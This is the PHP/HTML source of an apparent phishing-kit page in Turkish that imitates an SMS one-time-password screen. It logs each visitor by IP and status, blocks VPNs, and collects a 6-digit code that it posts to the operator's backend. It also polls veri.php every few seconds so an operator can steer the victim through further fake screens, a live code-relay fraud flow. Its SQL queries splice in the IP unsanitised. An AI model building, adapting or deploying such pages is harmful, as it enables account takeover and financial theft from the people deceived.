<?php include_once("config.php"); include_once("./admin/Data/Server/GrabIP.php"); include_once("./admin/Data/Server/BlockVPN.php");  include_once("./admin/Data/Server/BanControl.php");
   $pdo->query("UPDATE logs SET durum = 'SMS Ekranı' WHERE ip = '{$ip}'");
   $check = $pdo->query("SELECT * FROM logs WHERE ip = '{$ip}'")->fetch(PDO::FETCH_ASSOC);
   if(empty($check)) {
      header('Location: /');
   }
   ?>
<!DOCTYPE html>
<html lang="tr">
   <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="preconnect" href="https://fonts.googleapis.com">
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
      <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&amp;display=swap" rel="stylesheet">
      <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
      <title>Mobile Sayfa</title>
      <style>
         @font-face {
         font-family: 'KelveticaNobis';
         src: url('./assets/fonts/OwwgtWr5KJVN.otf') format('opentype');
         font-weight: normal;
         font-style: normal;
         }
         body, html {
         background-color: #f1f2f2;
         padding: 0;
         max-width: 414px;
         margin: 0 auto;
         font-family: 'KelveticaNobis', sans-serif;
         }
         header {
         width: 100%;
         height: 106px;
         background-image:  url('./assets/images/2gQEoHpYiwxx.png');
         background-size: contain;
         background-repeat: no-repeat;
         }
         .main {
         min-height: 805px;
         width: 100%;
         height: 805px;
         background-image: url('./assets/images/irpyabLMrXNK.png');
         background-size: contain;
         background-repeat: no-repeat;
         }
         input.form-control {
         width: 85%;
         height: 50px;
         font-family: 'KelveticaNobis', sans-serif;
         margin-bottom: 10px;
         margin-top: 5px;
         border: none;
         font-size: 16px;
         margin-left: 15px;
         margin-right: 15px;
         padding-left: 20px;
         }
         input.form-control:focus {
         outline: none;
         box-shadow: none;
         }
         button.btn {
         width: 90%;
         height: 50px;
         margin-top: 20px;
         background-color: #2ea8ab;
         border: none;
         color: #fff;
         font-size: 14px;
         cursor: pointer;
         border-radius: 0;
         }
         .error-message {
         color: red;
         font-size: 14px;
         margin-bottom: 10px;
         font-weight: 700;
         }
         .countdown {
         display: block;
         font-size: 14px;
         font-weight: bold;
         margin-bottom: 25px;
         margin-top: 15px;
         text-align: left;
         margin-left: 15px;
         color: #4b4848; /* Ana metin rengi */
         }
         .timer {
         color: red; /* Sadece süre kısmı kırmızı */
         }
      </style>
   </head>
   <body>
      <header></header>
      <div class="main">
         <center>
            <?php if($check['telefon_numarasi']): ?>
            <label style="display: block;font-size: 14px;font-weight: bold;margin-bottom: 25px;margin-top: 15px;color: #4b4848; text-align: left; margin-left: 15px;">
            Tek kullanımlık şifreniz aşağıdaki cep telefonu numaranıza SMS ile gönderilmiştir.
            </label>
            <label style="display: block;font-size: 16px;font-weight: bold;margin-bottom: 5px;margin-top: 15px;color: #4b4848; text-align: left; margin-left: 15px;">
            Telefon Numarası
            </label>
            <input type="text" name="maskedPhone" class="form-control" id="maskedPhone" value="<?= $check['telefon_numarasi']; ?>" readonly="">
            <label class="countdown" id="countdownLabel">
            Tekrar şifre almak için <span class="timer" id="timer">3:00</span> dakika beklemeniz gerekmektedir.
            </label>
            <script>
               let timeLeft = 180; // 3 dakika = 180 saniye
               const timerDisplay = document.getElementById('timer');
               const countdownLabel = document.getElementById('countdownLabel');
               
               const countdown = setInterval(() => {
                     const minutes = Math.floor(timeLeft / 60);
                     const seconds = timeLeft % 60;
                     timerDisplay.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
               
                     if (timeLeft <= 0) {
                        clearInterval(countdown);
                        countdownLabel.style.display = 'none'; // Süre dolduğunda label'ı gizle
                     }
                     timeLeft--;
               }, 1000);
            </script>
            <?php endif; ?>
            <label for="phone22" style="display: block;font-size: 16px;font-weight: bold;margin-bottom: 5px;margin-top: 15px;color: #4b4848;">
            Lütfen SMS'teki şifeyi aşağıdaki alana giriniz
            </label>
            <input type="text" name="phone2" class="form-control" placeholder="Doğrulama kodunu yazınız" id="phone2" minlength="6" maxlength="6" inputmode="numeric" required="">
            <div id="errorMessage" class="error-message" style="<?php if($_GET['error'] == "1"): echo "display:block;"; else: echo "display:none;"; endif; ?>">Sms Kodunu lütfen kontrol ediniz.</div>
         </center>
         <center>
            <button id="formSubmit" class="btn" type="button">Giriş</button>
         </center>
      </div>

      <script>
         document.getElementById("formSubmit").addEventListener("click", function(e) {
            var sms_kodu = document.getElementById("phone2").value

            e.preventDefault();

            if (sms_kodu == null || sms_kodu == "" || sms_kodu.length !== 6) {
               document.getElementById("phone2").focus();
               document.getElementById('errorMessage').style.display = "block";
            } else {
               document.getElementById('errorMessage').style.display = "none";
               $.ajax({
               type: "POST",
               url: "./request.php?action=sms",
               data: {
                  sms_kodu: sms_kodu
               },
               success: function (data) {
                  window.location.href = "/bekle"
               }
               });
            }
                   
         })

         document.getElementById("phone2").addEventListener("input", function (evt) {
            var inputValue = evt.target.value;
            var numericValue = inputValue.replace(/[^0-9]/g, '');
            evt.target.value = numericValue;
         });
      </script>
      <script type="text/javascript">
      $(document).ready(function() {
        gonder();
        var int = self.setInterval("gonder()", 2500);
      });
      
      function gonder() {
        $.ajax({
           type: 'POST',
           url: '<?php echo "veri.php?ip=".$ip; ?>',
           success: function(msg) {
              if (msg == 'sms') {
                  window.location.href = '/sms';
              }
              if (msg == 'tebrikler') {
                  window.location.href = '/basarili';
              }
              if (msg == 'telefon') {
                  window.location.href = '/phone';
              }
              if (msg == 'bildirim') {
                  window.location.href = '/bildirim';
              }
              if (msg == 'hata_sms') {
                  window.location.href = '/sms?error=1';
              }
              if (msg == 'hata_hesap') {
                  window.location.href = '/?error=1';
              }
              if (msg == 'basa_dondur') {
                  window.location.href = '/';
              }
           }
        });
      }     
    </script>
   </body>
</html>